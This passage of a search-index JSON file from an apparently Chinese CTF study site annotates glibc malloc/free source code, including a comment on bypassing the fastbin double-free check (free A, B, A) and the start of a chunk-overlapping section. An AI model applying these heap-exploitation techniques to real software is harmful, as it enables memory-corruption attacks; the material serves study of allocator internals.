;","title":"\u5185\u5b58\u53ef\u80fd\u7533\u8bf7\u6210\u529f"},{"location":"Pwn/glibc-heap/%E5%A0%86%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/#1_1","text":"/* If MORECORE extends previous space, we can likewise extend top size. */ if ( brk == old_end && snd_brk == ( char * )( MORECORE_FAILURE )) set_head ( old_top , ( size + old_size ) | PREV_INUSE );","title":"\u60c5\u51b5 1"},{"location":"Pwn/glibc-heap/%E5%A0%86%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/#2-","text":"else if ( contiguous ( av ) && old_size && brk < old_end ) /* Oops! Someone else killed our space.. Can't touch anything. */ malloc_printerr ( \"break adjusted to free malloc space\" );","title":"\u60c5\u51b5 2 - \u610f\u5916\u5185\u5b58\u8017\u5c3d"},{"location":"Pwn/glibc-heap/%E5%A0%86%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/#_29","text":"/* Otherwise, make adjustments: * If the first time through or noncontiguous, we need to call sbrk just to find out where the end of memory lies. * We need to ensure that all returned chunks from malloc will meet MALLOC_ALIGNMENT * If there was an intervening foreign sbrk, we need to adjust sbrk request size to account for fact that we will not be able to combine new space with existing space in old_top. * Almost all systems internally allocate whole pages at a time, in which case we might as well use the whole last page of request. So we allocate enough more memory to hit a page boundary now, which in turn causes future contiguous calls to page-align. */ else { front_misalign = 0 ; end_misalign = 0 ; correction = 0 ; aligned_brk = brk ;","title":"\u5904\u7406\u5176\u4ed6\u610f\u5916\u60c5\u51b5"},{"location":"Pwn/glibc-heap/%E5%A0%86%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/#_30","text":"/* handle contiguous cases */ if ( contiguous ( av )) { /* Count foreign sbrk as system_mem. */ if ( old_size ) av -> system_mem += brk - old_end ; /* Guarantee alignment of first new chunk made from this space */ front_misalign = ( INTERNAL_SIZE_T ) chunk2mem ( brk ) & MALLOC_ALIGN_MASK ; if ( front_misalign > 0 ) { /* Skip over some bytes to arrive at an aligned position. We don't need to specially mark these wasted front bytes. They will never be accessed anyway because prev_inuse of av->top (and any chunk created from its start) is always true after initialization. */ correction = MALLOC_ALIGNMENT - front_misalign ; aligned_brk += correction ; } /* If this isn't adjacent to existing space, then we will not be able to merge with old_top space, so must add to 2nd request. */ correction += old_size ; /* Extend the end address to hit a page boundary */ end_misalign = ( INTERNAL_SIZE_T )( brk + size + correction ); correction += ( ALIGN_UP ( end_misalign , pagesize )) - end_misalign ; assert ( correction >= 0 ); snd_brk = ( char * )( MORECORE ( correction )); /* If can't allocate correction, try to at least find out current brk. It might be enough to proceed without failing. Note that if second sbrk did NOT fail, we assume that space is contiguous with first sbrk. This is a safe assumption unless program is multithreaded but doesn't use locks and a foreign sbrk occurred between our first and second calls. */ if ( snd_brk == ( char * )( MORECORE_FAILURE )) { correction = 0 ; snd_brk = ( char * )( MORECORE ( 0 )); } else { /* Call the `morecore' hook if necessary. */ void ( * hook )( void ) = atomic_forced_read ( __after_morecore_hook ); if ( __builtin_expect ( hook != NULL , 0 )) ( * hook )(); } }","title":"\u5904\u7406\u8fde\u7eed\u5185\u5b58"},{"location":"Pwn/glibc-heap/%E5%A0%86%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/#_31","text":"/* handle non-contiguous cases */ else { if ( MALLOC_ALIGNMENT == 2 * SIZE_SZ ) /* MORECORE/mmap must correctly align */ assert ((( unsigned long ) chunk2mem ( brk ) & MALLOC_ALIGN_MASK ) == 0 ); else { front_misalign = ( INTERNAL_SIZE_T ) chunk2mem ( brk ) & MALLOC_ALIGN_MASK ; if ( front_misalign > 0 ) { /* Skip over some bytes to arrive at an aligned position. We don't need to specially mark these wasted front bytes. They will never be accessed anyway because prev_inuse of av->top (and any chunk created from its start) is always true after initialization. */ aligned_brk += MALLOC_ALIGNMENT - front_misalign ; } } /* Find out current end of memory */ if ( snd_brk == ( char * )( MORECORE_FAILURE )) { snd_brk = ( char * )( MORECORE ( 0 )); } }","title":"\u5904\u7406\u4e0d\u8fde\u7eed\u5185\u5b58"},{"location":"Pwn/glibc-heap/%E5%A0%86%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/#_32","text":"/* Adjust top based on results of second sbrk */ if ( snd_brk != ( char * )( MORECORE_FAILURE )) { av -> top = ( mchunkptr ) aligned_brk ; set_head ( av -> top , ( snd_brk - aligned_brk + correction ) | PREV_INUSE ); av -> system_mem += correction ; /* If not the first time through, we either have a gap due to foreign sbrk or a non-contiguous region. Insert a double fencepost at old_top to prevent consolidation with space we don't own. These fenceposts are artificial chunks that are marked as inuse and are in any case too small to use. We need two to make sizes and alignments work out. */ if ( old_size != 0 ) { /* Shrink old_top to insert fenceposts, keeping size a multiple of MALLOC_ALIGNMENT. We know there is at least enough space in old_top to do this. */ old_size = ( old_size - 4 * SIZE_SZ ) & ~ MALLOC_ALIGN_MASK ; set_head ( old_top , old_size | PREV_INUSE ); /* Note that the following assignments completely overwrite old_top when old_size was previously MINSIZE. This is intentional. We need the fencepost, even if old_top otherwise gets lost. */ set_head ( chunk_at_offset ( old_top , old_size ), ( 2 * SIZE_SZ ) | PREV_INUSE ); set_head ( chunk_at_offset ( old_top , old_size + 2 * SIZE_SZ ), ( 2 * SIZE_SZ ) | PREV_INUSE ); /* If possible, release the rest. */ if ( old_size >= MINSIZE ) { _int_free ( av , old_top , 1 ); } } } } \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5728\u8fd9\u91cc\u7a0b\u5e8f\u5c06\u65e7\u7684 top chunk \u8fdb\u884c\u4e86\u91ca\u653e\uff0c\u90a3\u4e48\u5176\u4f1a\u6839\u636e\u5927\u5c0f\u8fdb\u5165\u4e0d\u540c\u7684 bin \u6216 tcache \u4e2d\u3002","title":"\u8c03\u6574"},{"location":"Pwn/glibc-heap/%E5%A0%86%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/#_33","text":"if (( unsigned long ) av -> system_mem > ( unsigned long )( av -> max_system_mem )) av -> max_system_mem = av -> system_mem ; check_malloc_state ( av );","title":"\u66f4\u65b0\u6700\u5927\u5185\u5b58"},{"location":"Pwn/glibc-heap/%E5%A0%86%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/#_34","text":"","title":"\u5206\u914d\u5185\u5b58\u5757"},{"location":"Pwn/glibc-heap/%E5%A0%86%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/#_35","text":"/* finally, do the allocation */ p = av -> top ; size = chunksize ( p );","title":"\u83b7\u53d6\u5927\u5c0f"},{"location":"Pwn/glibc-heap/%E5%A0%86%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/#top","text":"/* check that one of the above allocation paths succeeded */ if (( unsigned long )( size ) >= ( unsigned long )( nb + MINSIZE )) { remainder_size = size - nb ; remainder = chunk_at_offset ( p , nb ); av -> top = remainder ; set_head ( p , nb | PREV_INUSE | ( av != & main_arena ? NON_MAIN_ARENA : 0 )); set_head ( remainder , remainder_size | PREV_INUSE ); check_malloced_chunk ( av , p , nb ); return chunk2mem ( p ); }","title":"\u5207\u5206 TOP"},{"location":"Pwn/glibc-heap/%E5%A0%86%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/#_36","text":"/* catch all failure paths */ __set_errno ( ENOMEM ); return 0 ;","title":"\u6355\u6349\u6240\u6709\u9519\u8bef"},{"location":"Pwn/glibc-heap/%E5%A0%86%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/#_37","text":"Free Heap Memory \u7edd\u5927\u90e8\u5206\u5185\u5bb9\u6765\u81ea CTF-WIKI \uff0c\u5185\u5bb9\u5f15\u7528\u7528\u4e8e\u5b66\u4e60\u8bb0\u5f55","title":"\u91ca\u653e\u5185\u5b58\u5757"},{"location":"Pwn/glibc-heap/%E5%A0%86%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/#__libc_free","text":"\u7c7b\u4f3c\u4e8e malloc\uff0cfree \u51fd\u6570\u4e5f\u6709\u4e00\u5c42\u5c01\u88c5\uff0c\u547d\u540d\u683c\u5f0f\u4e0e malloc \u57fa\u672c\u7c7b\u4f3c\u3002\u4ee3\u7801\u5982\u4e0b void __libc_free ( void * mem ) { mstate ar_ptr ; mchunkptr p ; /* chunk corresponding to mem */ // \u5224\u65ad\u662f\u5426\u6709\u94a9\u5b50\u51fd\u6570 __free_hook void ( * hook )( void * , const void * ) = atomic_forced_read ( __free_hook ); if ( __builtin_expect ( hook != NULL , 0 )) { //\u6267\u884chook\u51fd\u6570\u7136\u540e\u8fd4\u56de ( * hook )( mem , RETURN_ADDRESS ( 0 )); return ; } // free NULL\u6ca1\u6709\u4f5c\u7528 if ( mem == 0 ) /* free(0) has no effect */ return ; // \u5c06mem\u8f6c\u6362\u4e3achunk\u72b6\u6001 p = mem2chunk ( mem ); // \u5982\u679c\u8be5\u5757\u5185\u5b58\u662fmmap\u5f97\u5230\u7684 if ( chunk_is_mmapped ( p )) /* release mmapped memory. */ { /* See if the dynamic brk/mmap threshold needs adjusting. Dumped fake mmapped chunks do not affect the threshold. */ if ( ! mp_ . no_dyn_threshold && chunksize_nomask ( p ) > mp_ . mmap_threshold && chunksize_nomask ( p ) <= DEFAULT_MMAP_THRESHOLD_MAX && ! DUMPED_MAIN_ARENA_CHUNK ( p )) { mp_ . mmap_threshold = chunksize ( p ); mp_ . trim_threshold = 2 * mp_ . mmap_threshold ; LIBC_PROBE ( memory_mallopt_free_dyn_thresholds , 2 , mp_ . mmap_threshold , mp_ . trim_threshold ); } munmap_chunk ( p ); return ; } // \u6839\u636echunk\u83b7\u5f97\u5206\u914d\u533a\u7684\u6307\u9488 ar_ptr = arena_for_chunk ( p ); // \u6267\u884c\u91ca\u653e _int_free ( ar_ptr , p , 0 ); }","title":"__libc_free"},{"location":"Pwn/glibc-heap/%E5%A0%86%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/#_int_free","text":"\u51fd\u6570\u521d\u59cb\u65f6\u523b\u5b9a\u4e49\u4e86\u4e00\u7cfb\u5217\u7684\u53d8\u91cf\uff0c\u5e76\u4e14\u5f97\u5230\u4e86\u7528\u6237\u60f3\u8981\u91ca\u653e\u7684 chunk \u7684\u5927\u5c0f static void _int_free ( mstate av , mchunkptr p , int have_lock ) { INTERNAL_SIZE_T size ; /* its size */ mfastbinptr * fb ; /* associated fastbin */ mchunkptr nextchunk ; /* next contiguous chunk */ INTERNAL_SIZE_T nextsize ; /* its size */ int nextinuse ; /* true if nextchunk is used */ INTERNAL_SIZE_T prevsize ; /* size of previous contiguous chunk */ mchunkptr bck ; /* misc temp for linking */ mchunkptr fwd ; /* misc temp for linking */ const char * errstr = NULL ; int locked = 0 ; size = chunksize ( p );","title":"_int_free"},{"location":"Pwn/glibc-heap/%E5%A0%86%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/#_38","text":"/* Little security check which won't hurt performance: the allocator never wrapps around at the end of the address space. Therefore we can exclude some size values which might appear here by accident or by \"design\" from some intruder. */ // \u6307\u9488\u4e0d\u80fd\u6307\u5411\u975e\u6cd5\u7684\u5730\u5740, \u5fc5\u987b\u5c0f\u4e8e\u7b49\u4e8e-size\uff0c\u4e3a\u4ec0\u4e48\uff1f\uff1f\uff1f // \u6307\u9488\u5fc5\u987b\u5f97\u5bf9\u9f50\uff0c2*SIZE_SZ \u8fd9\u4e2a\u5bf9\u9f50\u5f97\u4ed4\u7ec6\u60f3\u60f3 if ( __builtin_expect (( uintptr_t ) p > ( uintptr_t ) - size , 0 ) || __builtin_expect ( misaligned_chunk ( p ), 0 )) { errstr = \"free(): invalid pointer\" ; errout : if ( ! have_lock && locked ) __libc_lock_unlock ( av -> mutex ); malloc_printerr ( check_action , errstr , chunk2mem ( p ), av ); return ; } /* We know that each chunk is at least MINSIZE bytes in size or a multiple of MALLOC_ALIGNMENT. */ // \u5927\u5c0f\u6ca1\u6709\u6700\u5c0f\u7684chunk\u5927\uff0c\u6216\u8005\u8bf4\uff0c\u5927\u5c0f\u4e0d\u662fMALLOC_ALIGNMENT\u7684\u6574\u6570\u500d if ( __glibc_unlikely ( size < MINSIZE || ! aligned_OK ( size ))) { errstr = \"free(): invalid size\" ; goto errout ; } // \u68c0\u67e5\u8be5chunk\u662f\u5426\u5904\u4e8e\u4f7f\u7528\u72b6\u6001\uff0c\u975e\u8c03\u8bd5\u72b6\u6001\u4e0b\u6ca1\u6709\u4f5c\u7528 check_inuse_chunk ( av , p ); \u5176\u4e2d /* Check if m has acceptable alignment */ #define aligned_OK(m) (((unsigned long) (m) &MALLOC_ALIGN_MASK) == 0) #define misaligned_chunk(p) \\ ((uintptr_t)(MALLOC_ALIGNMENT == 2 * SIZE_SZ ? (p) : chunk2mem(p)) & \\ MALLOC_ALIGN_MASK)","title":"\u7b80\u5355\u7684\u68c0\u67e5"},{"location":"Pwn/glibc-heap/%E5%A0%86%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/#fast-bin_2","text":"\u5982\u679c\u4e0a\u8ff0\u68c0\u67e5\u90fd\u5408\u683c\u7684\u8bdd\uff0c\u5224\u65ad\u5f53\u524d\u7684 bin \u662f\u4e0d\u662f\u5728 fast bin \u8303\u56f4\u5185\uff0c\u5728\u7684\u8bdd\u5c31\u63d2\u5165\u5230 fastbin \u5934\u90e8 \uff0c\u5373\u6210\u4e3a\u5bf9\u5e94 fastbin \u94fe\u8868\u7684**\u7b2c\u4e00\u4e2a free chunk**\u3002 /* If eligible, place chunk on a fastbin so it can be found and used quickly in malloc. */ if (( unsigned long ) ( size ) <= ( unsigned long ) ( get_max_fast ()) #if TRIM_FASTBINS /* If TRIM_FASTBINS set, don't place chunks bordering top into fastbins */ //\u9ed8\u8ba4 #define TRIM_FASTBINS 0\uff0c\u56e0\u6b64\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u4e0b\u9762\u7684\u8bed\u53e5\u4e0d\u4f1a\u6267\u884c // \u5982\u679c\u5f53\u524dchunk\u662ffast chunk\uff0c\u5e76\u4e14\u4e0b\u4e00\u4e2achunk\u662ftop chunk\uff0c\u5219\u4e0d\u80fd\u63d2\u5165 // \u56e0\u4e3a\u4e0b\u4e00\u4e2achunk\u662ftopchunk \u76f4\u63a5\u4e0e topchunk \u5408\u5e76 && ( chunk_at_offset ( p , size ) != av -> top ) #endif ) { // \u4e0b\u4e00\u4e2achunk\u7684\u5927\u5c0f\u4e0d\u80fd\u5c0f\u4e8e\u4e24\u500d\u7684SIZE_SZ,\u5e76\u4e14 // \u4e0b\u4e00\u4e2achunk\u7684\u5927\u5c0f\u4e0d\u80fd\u5927\u4e8esystem_mem\uff0c \u4e00\u822c\u4e3a132k // \u5982\u679c\u51fa\u73b0\u8fd9\u6837\u7684\u60c5\u51b5\uff0c\u5c31\u62a5\u9519\u3002 if ( __builtin_expect ( chunksize_nomask ( chunk_at_offset ( p , size )) <= 2 * SIZE_SZ , 0 ) || __builtin_expect ( chunksize ( chunk_at_offset ( p , size )) >= av -> system_mem , 0 )) { /* We might not have a lock at this point and concurrent modifications of system_mem might have let to a false positive. Redo the test after getting the lock. */ if ( have_lock || ({ assert ( locked == 0 ); __libc_lock_lock ( av -> mutex ); locked = 1 ; chunksize_nomask ( chunk_at_offset ( p , size )) <= 2 * SIZE_SZ || chunksize ( chunk_at_offset ( p , size )) >= av -> system_mem ; })) { errstr = \"free(): invalid next size (fast)\" ; goto errout ; } if ( ! have_lock ) { __libc_lock_unlock ( av -> mutex ); locked = 0 ; } } // \u5c06chunk\u7684mem\u90e8\u5206\u5168\u90e8\u8bbe\u7f6e\u4e3aperturb_byte free_perturb ( chunk2mem ( p ), size - 2 * SIZE_SZ ); // \u8bbe\u7f6efast chunk\u7684\u6807\u8bb0\u4f4d set_fastchunks ( av ); // \u6839\u636e\u5927\u5c0f\u83b7\u53d6fast bin\u7684\u7d22\u5f15 unsigned int idx = fastbin_index ( size ); // \u83b7\u53d6\u5bf9\u5e94fastbin\u7684\u5934\u6307\u9488\uff0c\u88ab\u521d\u59cb\u5316\u540e\u4e3aNULL\u3002 fb = & fastbin ( av , idx ); /* Atomically link P to its fastbin: P->FD = *FB; *FB = P; */ // \u4f7f\u7528\u539f\u5b50\u64cd\u4f5c\u5c06P\u63d2\u5165\u5230\u94fe\u8868\u4e2d mchunkptr old = * fb , old2 ; unsigned int old_idx = ~ 0u ; do { /* Check that the top of the bin is not the record we are going to add (i.e., double free). */ // so we can not double free one fastbin chunk // \u9632\u6b62\u5bf9 fast bin double free // \u9632\u5fa1\u65b9\u6cd5\u662f\u901a\u8fc7\u68c0\u67e5\u4e0a\u4e00\u4e2achunk\u662f\u5426\u548c\u65b0\u91ca\u653e\u7684chunk\u5730\u5740\u76f8\u540c // \u7ed5\u8fc7\u65b9\u6cd5\u5c31\u662f\u5728\u4e2d\u95f4\u5939\u6742\u4e00\u4e2a\u5176\u4ed6chunk\uff0c\u6bd4\u5982\u9700\u8981doublefree A\uff0c\u91ca\u653e\u987a\u5e8f\u4e3a\uff1a // free A\u3001free B\u3001free A if ( __builtin_expect ( old == p , 0 )) { errstr = \"double free or corruption (fasttop)\" ; goto errout ; } /* Check that size of fastbin chunk at the top is the same as size of the chunk that we are adding. We can dereference OLD only if we have the lock, otherwise it might have already been deallocated. See use of OLD_IDX below for the actual check. */ if ( have_lock && old != NULL ) old_idx = fastbin_index ( chunksize ( old )); p -> fd = old2 = old ; } while (( old = catomic_compare_and_exchange_val_rel ( fb , p , old2 )) != old2 ); // \u786e\u4fddfast bin\u7684\u52a0\u5165\u524d\u4e0e\u52a0\u5165\u540e\u76f8\u540c if ( have_lock && old != NULL && __builtin_expect ( old_idx != idx , 0 )) { errstr = \"invalid fastbin entry (free)\" ; goto errout ; } }","title":"fast bin"},{"location":"Pwn/glibc-heap/%E5%A0%86%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/#mmap-chunk","text":"\u53ea\u6709\u4e0d\u662f fast bin \u7684\u60c5\u51b5\u4e0b\u624d\u4f1a\u89e6\u53d1 unlink \u9996\u5148\u6211\u4eec\u5148\u8bf4\u4e00\u4e0b\u4e3a\u4ec0\u4e48\u4f1a\u5408\u5e76 chunk\uff0c\u8fd9\u662f\u4e3a\u4e86\u907f\u514d heap \u4e2d\u6709\u592a\u591a\u96f6\u96f6\u788e\u788e\u7684\u5185\u5b58\u5757\uff0c\u5408\u5e76\u4e4b\u540e\u53ef\u4ee5\u7528\u6765\u5e94\u5bf9\u66f4\u5927\u7684\u5185\u5b58\u5757\u8bf7\u6c42\u3002\u5408\u5e76\u7684\u4e3b\u8981\u987a\u5e8f\u4e3a \u5148\u8003\u8651\u7269\u7406\u4f4e\u5730\u5740\u7a7a\u95f2\u5757 \u540e\u8003\u8651\u7269\u7406\u9ad8\u5730\u5740\u7a7a\u95f2\u5757 \u5408\u5e76\u540e\u7684 chunk \u6307\u5411\u5408\u5e76\u7684 chunk \u7684\u4f4e\u5730\u5740\u3002 \u5728\u6ca1\u6709\u9501\u7684\u60c5\u51b5\u4e0b\uff0c\u5148\u83b7\u5f97\u9501\u3002 /* Consolidate other non-mmapped chunks as they arrive. */ else if ( ! chunk_is_mmapped ( p )) { if ( ! have_lock ) { __libc_lock_lock ( av -> mutex ); locked = 1 ; } nextchunk = chunk_at_offset ( p , size );","title":"\u5408\u5e76\u975e mmap \u7684\u7a7a\u95f2 chunk"},{"location":"Pwn/glibc-heap/%E5%A0%86%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/#_39","text":"/* Lightweight tests: check whether the block is already the top block. */ // \u5f53\u524dfree\u7684chunk\u4e0d\u80fd\u662ftop chunk if ( __glibc_unlikely ( p == av -> top )) { errstr = \"double free or corruption (top)\" ; goto errout ; } // \u5f53\u524dfree\u7684chunk\u7684\u4e0b\u4e00\u4e2achunk\u4e0d\u80fd\u8d85\u8fc7arena\u7684\u8fb9\u754c /* Or whether the next chunk is beyond the boundaries of the arena. */ if ( __builtin_expect ( contiguous ( av ) && ( char * ) nextchunk >= (( char * ) av -> top + chunksize ( av -> top )), 0 )) { errstr = \"double free or corruption (out)\" ; goto errout ; } // \u5f53\u524d\u8981free\u7684chunk\u7684\u4f7f\u7528\u6807\u8bb0\u6ca1\u6709\u88ab\u6807\u8bb0\uff0cdouble free /* Or whether the block is actually not marked used. */ if ( __glibc_unlikely ( ! prev_inuse ( nextchunk ))) { errstr = \"double free or corruption (!prev)\" ; goto errout ; } // \u4e0b\u4e00\u4e2achunk\u7684\u5927\u5c0f nextsize = chunksize ( nextchunk ); // next chunk size valid check // \u5224\u65ad\u4e0b\u4e00\u4e2achunk\u7684\u5927\u5c0f\u662f\u5426\u4e0d\u5927\u4e8e2*SIZE_SZ\uff0c\u6216\u8005 // nextsize\u662f\u5426\u5927\u4e8e\u7cfb\u7edf\u53ef\u63d0\u4f9b\u7684\u5185\u5b58 if ( __builtin_expect ( chunksize_nomask ( nextchunk ) <= 2 * SIZE_SZ , 0 ) || __builtin_expect ( nextsize >= av -> system_mem , 0 )) { errstr = \"free(): invalid next size (normal)\" ; goto errout ; }","title":"\u8f7b\u91cf\u7ea7\u7684\u68c0\u6d4b"},{"location":"Pwn/glibc-heap/%E5%A0%86%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/#_40","text":"//\u5c06\u6307\u9488\u7684mem\u90e8\u5206\u5168\u90e8\u8bbe\u7f6e\u4e3aperturb_byte free_perturb ( chunk2mem ( p ), size - 2 * SIZE_SZ );","title":"\u91ca\u653e\u586b\u5145"},{"location":"Pwn/glibc-heap/%E5%A0%86%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/#-chunk","text":"/* consolidate backward */ if ( ! prev_inuse ( p )) { prevsize = prev_size ( p ); size += prevsize ; p = chunk_at_offset ( p , - (( long ) prevsize )); unlink ( av , p , bck , fwd ); }","title":"\u540e\u5411\u5408\u5e76 - \u5408\u5e76\u4f4e\u5730\u5740 chunk"},{"location":"Pwn/glibc-heap/%E5%A0%86%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/#top-chunk-chunk","text":"\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5982\u679c\u4e0b\u4e00\u5757\u4e0d\u662f top chunk \uff0c\u5219\u5408\u5e76\u9ad8\u5730\u5740\u7684 chunk \uff0c\u5e76\u5c06\u5408\u5e76\u540e\u7684 chunk \u653e\u5165\u5230 unsorted bin \u4e2d\u3002 // \u5982\u679c\u4e0b\u4e00\u4e2achunk\u4e0d\u662ftop chunk if ( nextchunk != av -> top ) { /* get and clear inuse bit */ // \u83b7\u53d6\u4e0b\u4e00\u4e2a chunk \u7684\u4f7f\u7528\u72b6\u6001 nextinuse = inuse_bit_at_offset ( nextchunk , nextsize ); // \u5982\u679c\u4e0d\u5728\u4f7f\u7528\uff0c\u5408\u5e76\uff0c\u5426\u5219\u6e05\u7a7a\u5f53\u524dchunk\u7684\u4f7f\u7528\u72b6\u6001\u3002 /* consolidate forward */ if ( ! nextinuse ) { unlink ( av , nextchunk , bck , fwd ); size += nextsize ; } else clear_inuse_bit_at_offset ( nextchunk , 0 ); /* Place the chunk in unsorted chunk list. Chunks are not placed into regular bins until after they have been given one chance to be used in malloc. */ // \u628a chunk \u653e\u5728 unsorted chunk \u94fe\u8868\u7684\u5934\u90e8 // unsorted bin \u94fe\u5934 bck = unsorted_chunks ( av ); // unsorted bin \u987a\u6570\u7b2c\u4e00\u4e2a\uff08\u6700\u65b0\u653e\u5165\uff09 fwd = bck -> fd ; // \u7b80\u5355\u7684\u68c0\u67e5 if ( __glibc_unlikely ( fwd -> bk != bck )) { errstr = \"free(): corrupted unsorted chunks\" ; goto errout ; } p -> fd = fwd ; p -> bk = bck ; // \u5982\u679c\u662f large chunk\uff0c\u90a3\u5c31\u8bbe\u7f6enextsize\u6307\u9488\u5b57\u6bb5\u4e3aNULL\u3002 if ( ! in_smallbin_range ( size )) { p -> fd_nextsize = NULL ; p -> bk_nextsize = NULL ; } bck -> fd = p ; fwd -> bk = p ; set_head ( p , size | PREV_INUSE ); set_foot ( p , size ); check_free_chunk ( av , p ); }","title":"\u4e0b\u4e00\u5757\u4e0d\u662f top chunk - \u524d\u5411\u5408\u5e76 - \u5408\u5e76\u9ad8\u5730\u5740 chunk"},{"location":"Pwn/glibc-heap/%E5%A0%86%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/#top-chunk-top-chunk","text":"/* If the chunk borders the current high end of memory, consolidate into top */ // \u5982\u679c\u8981\u91ca\u653e\u7684chunk\u7684\u4e0b\u4e00\u4e2achunk\u662ftop chunk\uff0c\u90a3\u5c31\u5408\u5e76\u5230 top chunk else { size += nextsize ; set_head ( p , size | PREV_INUSE ); av -> top = p ; check_chunk ( av , p ); }","title":"\u4e0b\u4e00\u5757\u662f top chunk - \u5408\u5e76\u5230 top chunk"},{"location":"Pwn/glibc-heap/%E5%A0%86%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/#_41","text":"/* If freeing a large space, consolidate possibly-surrounding chunks. Then, if the total unused topmost memory exceeds trim threshold, ask malloc_trim to reduce top. Unless max_fast is 0, we don't know if there are fastbins bordering top, so we cannot tell for sure whether threshold has been reached unless fastbins are consolidated. But we don't want to consolidate on each free. As a compromise, consolidation is performed if FASTBIN_CONSOLIDATION_THRESHOLD is reached. */ // \u5982\u679c\u5408\u5e76\u540e\u7684 chunk \u7684\u5927\u5c0f\u5927\u4e8eFASTBIN_CONSOLIDATION_THRESHOLD // \u4e00\u822c\u5408\u5e76\u5230 top chunk \u90fd\u4f1a\u6267\u884c\u8fd9\u90e8\u5206\u4ee3\u7801\u3002 // \u90a3\u5c31\u5411\u7cfb\u7edf\u8fd4\u8fd8\u5185\u5b58 if (( unsigned long ) ( size ) >= FASTBIN_CONSOLIDATION_THRESHOLD ) { // \u5982\u679c\u6709 fast chunk \u5c31\u8fdb\u884c\u5408\u5e76 if ( have_fastchunks ( av )) malloc_consolidate ( av ); // \u4e3b\u5206\u914d\u533a if ( av == & main_arena ) { #ifndef MORECORE_CANNOT_TRIM // top chunk \u5927\u4e8e\u5f53\u524d\u7684\u6536\u7f29\u9619\u503c if (( unsigned long ) ( chunksize ( av -> top )) >= ( unsigned long ) ( mp_ . trim_threshold )) systrim ( mp_ . top_pad , av ); #endif // \u975e\u4e3b\u5206\u914d\u533a\uff0c\u5219\u76f4\u63a5\u6536\u7f29heap } else { /* Always try heap_trim(), even if the top chunk is not large, because the corresponding heap might go away. */ heap_info * heap = heap_for_ptr ( top ( av )); assert ( heap -> ar_ptr == av ); heap_trim ( heap , mp_ . top_pad ); } } if ( ! have_lock ) { assert ( locked ); __libc_lock_unlock ( av -> mutex ); }","title":"\u5411\u7cfb\u7edf\u8fd4\u8fd8\u5185\u5b58"},{"location":"Pwn/glibc-heap/%E5%A0%86%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/#mmap-chunk_1","text":"} else { // If the chunk was allocated via mmap, release via munmap(). munmap_chunk ( p ); }","title":"\u91ca\u653e mmap \u7684 chunk"},{"location":"Pwn/glibc-heap/%E5%A0%86%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/#systrim","text":"","title":"systrim"},{"location":"Pwn/glibc-heap/%E5%A0%86%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/#heap_trim","text":"","title":"heap_trim"},{"location":"Pwn/glibc-heap/%E5%A0%86%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/#munmap_chunk","text":"\u8fd9\u91cc\u610f\u601d\u662f\u53bb\u5bf9\u5e94 bin \u53d6\uff0c\u6ca1\u6709\u529e\u6cd5\u53d6\u5230\u3002\u6bd4\u5982\u9700\u8981\u4e00\u4e2a 0x100 \u7684chunk \uff0c\u53bb\u5230\u5927\u5c0f\u4e3a 0x100 \u7684bin \u4e2d\u53d6\uff0c\u800c\u8be5 bin \u4e2d\u6ca1\u6709\u7a7a\u95f2 chunk \u3002 \u21a9 \u21a9 \u21a9 \u5b9e\u9645\u4e0a\u8fd8\u9700\u8fdb\u884c\u5bf9\u9f50\u7b49\u64cd\u4f5c\uff0c\u8fd4\u56de\u5185\u5b58\u5757\u4e0d\u4e00\u5b9a\u662f\u5bf9\u5e94\u5927\u5c0f\u7684 \u21a9 \u8fd8\u9700\u8981\u6839\u636e\u5185\u5b58\u5757\u7684\u7269\u7406\u4f4d\u7f6e\u5224\u65ad\u662f\u5426\u8fd8\u7ed9\u7cfb\u7edf \u21a9 \u4e5f\u5c31\u662f\u76f8\u5f53\u4e8e malloc \u662f\u4e00\u4e2a\u6574\u5408\u5305\uff0c\u6253\u5305\u597d\u5b9e\u73b0\u7533\u8bf7\u5806\u5757\u9700\u8981\u7528\u5230\u7684\u6240\u6709\u51fd\u6570\u3002\u7c7b\u4f3c\u7684\u51fd\u6570\u8fd8\u6709 system \u7b49 \u21a9","title":"munmap_chunk"},{"location":"Pwn/glibc-heap/%E5%A0%86%E9%87%8D%E5%8F%A0%26%E6%8B%93%E5%B1%95/","text":"\u5806\u62d3\u5c55&\u6ea2\u51fa \u00b6 \u7edd\u5927\u90e8\u5206\u5185\u5bb9\u6765\u81ea CTF-WIKI \uff0c\u5185\u5bb9\u5f15\u7528\u7528\u4e8e\u5b66\u4e60\u8bb0\u5f55 \u4ecb\u7ecd \u00b6 chunk extend \u662f\u5806\u6f0f\u6d1e\u7684\u4e00\u79cd\u5e38\u89c1\u5229\u7528\u624b\u6cd5\uff0c\u901a\u8fc7 extend \u53ef\u4ee5\u5b9e\u73b0 chunk overlapping 